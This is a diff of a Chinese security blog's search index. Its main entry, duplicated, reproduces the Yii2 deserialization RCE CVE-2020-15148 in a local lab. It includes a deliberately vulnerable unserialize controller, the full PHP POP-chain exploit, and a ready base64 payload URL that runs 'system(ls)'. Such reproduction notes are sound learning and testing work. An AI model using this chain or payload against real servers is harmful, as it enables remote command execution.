@@ -422,6 +422,99 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</title>
+    <url>/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-15148-PHP-Yii框架反序列化漏洞复现"><a href="#CVE-2020-15148-PHP-Yii框架反序列化漏洞复现" class="headerlink" title="CVE-2020-15148 PHP-Yii框架反序列化漏洞复现"></a>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</h1><span id="more"></span>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>在ctfshow web267 这题中很好的体现了此漏洞。</p>
+<p>参考链接:<a href="https://www.freebuf.com/vuls/260352.html">CVE-2020-15148 Yii2反序列化RCE分析与复现 - FreeBuf网络安全行业门户</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
+<li><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">Release 2.0.37 · yiisoft/yii2 (github.com)</a></p>
+</li>
+<li><p>下载 : yii-basic-app-2.0.37.tgz</p>
+</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
+<ul>
+<li><p>系统环境: kali 2021（子系统）</p>
+</li>
+<li><p>将下载的压缩包解压，进入目录将会看到如下文件:</p>
+</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
+<ul>
+<li>进入 ./confog/web.php 将 cookieValidationKey 修改一下，内容随便都可以。不修改启动网页将报错。</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
+<ul>
+<li>输入 php yii serve 启动这个网页。本地8080端口并本地查看</li>
+</ul>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
+<ul>
+<li><p>如图所示成功访问页面，接下来 尝试 弱口令登陆: admin:admin</p>
+</li>
+<li><p>创建反序列化入口: ./controllers/TestController.php</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BackdoorController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionShell</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$code</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>入口创建成功，现在来看看大佬的 exp：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="comment">//             4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">                <span class="comment">//                             3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">                <span class="comment">//                     2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        //                             1</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 1 处 可以看到 new yii\db\BatchQueryResult 对象，从而执行了 class BatchQueryResult中的 construct()函数( 2  )。</li>
+<li>在 2 处  construct()函数中，new Generator 对象，从而执行了 class Generator中的 construct()函数( 3 )</li>
+<li>在 3 处  construct()函数中，new CreateAction 对象，从而执行了 class CreateAction 中的construct()函数中的可控参数（ 4 ）</li>
+<li>这个执行过程就是一个套娃环节。</li>
+<li>现在大致了解了 exp 是如何运行的了。</li>
+<li>所以现在来利用一下这个 exp 吧。深层次的我也解释不清而且这个复现网上很多，能用就行。</li>
+</ul>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul>
+<li>url 入口:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=xxx // xxx 为 exp 生成的内容。</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先将可控参数设置为 phpinfo 并查看是否会显示处我本地的 php环境。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
+<ul>
+<li>如图所示成功显示了 phpinfo 信息。</li>
+<li>再将可控参数改为我们想执行的语句。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 可控参数,注意 若 system不可用,可用passthru，shell_exec 等代替。</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
+<ul>
+<li><p>如图所示成功显示出当前目录下的内容。</p>
+</li>
+<li><p>至此，我们可以通过这个漏洞来达到我们的目的。</p>
+</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>CVE-2020-15148</li>
+<li>这个漏洞，可能会作为变种出现的 CTF web 题当中，ctshow web267 就是最好的例子。</li>
+<li>革命尚未成功，我等还需努力。</li>
+<li>PHP 是世界上最好的语言。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTFShow 文件包含笔记</title>
     <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
@@ -588,116 +681,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</title>
-    <url>/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-15148-PHP-Yii框架反序列化漏洞复现"><a href="#CVE-2020-15148-PHP-Yii框架反序列化漏洞复现" class="headerlink" title="CVE-2020-15148 PHP-Yii框架反序列化漏洞复现"></a>CVE-2020-15148 PHP-Yii框架反序列化漏洞复现</h1><span id="more"></span>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>在ctfshow web267 这题中很好的体现了此漏洞。</p>
-<p>参考链接:<a href="https://www.freebuf.com/vuls/260352.html">CVE-2020-15148 Yii2反序列化RCE分析与复现 - FreeBuf网络安全行业门户</a></p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
-<li><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">Release 2.0.37 · yiisoft/yii2 (github.com)</a></p>
-</li>
-<li><p>下载 : yii-basic-app-2.0.37.tgz</p>
-</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
-<ul>
-<li><p>系统环境: kali 2021（子系统）</p>
-</li>
-<li><p>将下载的压缩包解压，进入目录将会看到如下文件:</p>
-</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
-<ul>
-<li>进入 ./confog/web.php 将 cookieValidationKey 修改一下，内容随便都可以。不修改启动网页将报错。</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
-<ul>
-<li>输入 php yii serve 启动这个网页。本地8080端口并本地查看</li>
-</ul>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png"></p>
-<ul>
-<li><p>如图所示成功访问页面，接下来 尝试 弱口令登陆: admin:admin</p>
-</li>
-<li><p>创建反序列化入口: ./controllers/TestController.php</p>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BackdoorController</span> <span class="keyword">extends</span> \<span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionShell</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$code</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul>
-<li>入口创建成功，现在来看看大佬的 exp：</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">                <span class="comment">//             4</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">                <span class="comment">//                             3</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">                <span class="comment">//                     2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        //                             1</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在 1 处 可以看到 new yii\db\BatchQueryResult 对象，从而执行了 class BatchQueryResult中的 construct()函数( 2  )。</li>
-<li>在 2 处  construct()函数中，new Generator 对象，从而执行了 class Generator中的 construct()函数( 3 )</li>
-<li>在 3 处  construct()函数中，new CreateAction 对象，从而执行了 class CreateAction 中的construct()函数中的可控参数（ 4 ）</li>
-<li>这个执行过程就是一个套娃环节。</li>
-<li>现在大致了解了 exp 是如何运行的了。</li>
-<li>所以现在来利用一下这个 exp 吧。深层次的我也解释不清而且这个复现网上很多，能用就行。</li>
-</ul>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul>
-<li>url 入口:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=xxx // xxx 为 exp 生成的内容。</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>首先将可控参数设置为 phpinfo 并查看是否会显示处我本地的 php环境。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png"></p>
-<ul>
-<li>如图所示成功显示了 phpinfo 信息。</li>
-<li>再将可控参数改为我们想执行的语句。</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>; <span class="comment">// 可控参数,注意 若 system不可用,可用passthru，shell_exec 等代替。</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>; <span class="comment">// 可控参数</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png"></p>
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png"></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:8080/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/11/CVE-2020-15148-PHP-Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png"></p>
-<ul>
-<li><p>如图所示成功显示出当前目录下的内容。</p>
-</li>
-<li><p>至此，我们可以通过这个漏洞来达到我们的目的。</p>
-</li>
-</ul>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li>CVE-2020-15148</li>
-<li>这个漏洞，可能会作为变种出现的 CTF web 题当中，ctshow web267 就是最好的例子。</li>
-<li>革命尚未成功，我等还需努力。</li>
-<li>PHP 是世界上最好的语言。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF笔记</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>vulnhub靶场——The Planets:Earth</title>
-    <url>/2022/02/08/vulnhub%E9%9D%B6%E5%9C%BA%E2%80%94%E2%80%94The-Planets-Earth/</url>
-    <content><![CDATA[<h2 id="vulnhub靶场——The-Planets-Earth"><a href="#vulnhub靶场——The-Planets-Earth" class="headerlink" title="vulnhub靶场——The Planets:Earth"></a>vulnhub靶场——The Planets:Earth</h2>
-
-	<div class="row">
-    <embed src="earth.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——6Days_lab-v1.0.1</title>
     <url>/2021/12/09/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%946Days-lab-v1-0-1/</url>
     <content><![CDATA[<h2 id="web渗透——6Days-lab-v1-0-1"><a href="#web渗透——6Days-lab-v1-0-1" class="headerlink" title="web渗透——6Days_lab-v1.0.1"></a>web渗透——6Days_lab-v1.0.1</h2><p>靶机:</p>
@@ -821,24 +804,6 @@
       </categories>
   </entry>
   <entry>
-    <title>web渗透——Medium_socnet</title>
-    <url>/2022/01/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Medium-socnet/</url>
-    <content><![CDATA[<h2 id="web渗透——Medium-socnet"><a href="#web渗透——Medium-socnet" class="headerlink" title="web渗透——Medium_socnet"></a>web渗透——Medium_socnet</h2><p>靶机:</p>
-<p>pdf</p>
-
-
-	<div class="row">
-    <embed src="medium_socnet.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
     <title>web渗透——Kioptrix leve1-3</title>
     <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kioptrix-leve1-3/</url>
     <content><![CDATA[<h2 id="web渗透——Kioptrix-leve1-3"><a href="#web渗透——Kioptrix-leve1-3" class="headerlink" title="web渗透——Kioptrix leve1-3"></a>web渗透——Kioptrix leve1-3</h2><h3 id="Kioptrix-leve1"><a href="#Kioptrix-leve1" class="headerlink" title="Kioptrix leve1"></a>Kioptrix leve1</h3>
@@ -878,6 +843,24 @@
       </categories>
   </entry>
   <entry>
+    <title>web渗透——Medium_socnet</title>
+    <url>/2022/01/17/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Medium-socnet/</url>
+    <content><![CDATA[<h2 id="web渗透——Medium-socnet"><a href="#web渗透——Medium-socnet" class="headerlink" title="web渗透——Medium_socnet"></a>web渗透——Medium_socnet</h2><p>靶机:</p>
+<p>pdf</p>
+
+
+	<div class="row">
+    <embed src="medium_socnet.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
     <title>web渗透——MrRobot</title>
     <url>/2021/12/15/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94MrRobot/</url>
     <content><![CDATA[<h2 id="web渗透——MrRobot"><a href="#web渗透——MrRobot" class="headerlink" title="web渗透——MrRobot"></a>web渗透——MrRobot</h2><p>印象笔记链接:</p>
@@ -888,25 +871,6 @@
 
 	<div class="row">
     <embed src="MrRobot.pdf" width="100%" height="550" type="application/pdf">
-	</div>
-
-
-
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>web渗透——Quaoar</title>
-    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Quaoar/</url>
-    <content><![CDATA[<h2 id="web渗透——Quaoar"><a href="#web渗透——Quaoar" class="headerlink" title="web渗透——Quaoar"></a>web渗透——Quaoar</h2><center>靶机quaoa</center>
-
-
-
-	<div class="row">
-    <embed src="Readme.pdf" width="100%" height="550" type="application/pdf">
 	</div>
 
 
@@ -931,6 +895,25 @@
 
 
 <p><em>注意请在电脑端浏览器查看。</em></p>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>web渗透——Quaoar</title>
+    <url>/2021/12/08/web%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Quaoar/</url>
+    <content><![CDATA[<h2 id="web渗透——Quaoar"><a href="#web渗透——Quaoar" class="headerlink" title="web渗透——Quaoar"></a>web渗透——Quaoar</h2><center>靶机quaoa</center>
+
+
+
+	<div class="row">
+    <embed src="Readme.pdf" width="100%" height="550" type="application/pdf">
+	</div>
+
+
+
+
 ]]></content>
       <categories>
         <category>web渗透</category>
@@ -1006,6 +989,23 @@
       </categories>
   </entry>
   <entry>
+    <title>云服务器配置NPS服务实现内网穿透</title>
